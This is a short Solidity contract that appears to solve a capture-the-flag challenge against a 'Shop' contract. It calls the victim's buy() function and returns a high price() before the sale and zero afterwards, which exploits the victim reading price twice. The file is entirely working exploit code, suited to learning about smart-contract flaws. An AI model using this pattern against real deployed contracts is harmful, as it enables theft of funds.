//SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IShop {
    function isSold() external view returns (bool);
}

contract Solving {
    address victim;

    constructor(address _victim) {
        victim = _victim;
    }

    function solve() external {
        victim.call(abi.encodeWithSignature("buy()"));
    }

    function price() external view returns (uint256) {
        if (IShop(victim).isSold() == false) {
            return 100;
        }
        return 0;
    }
}
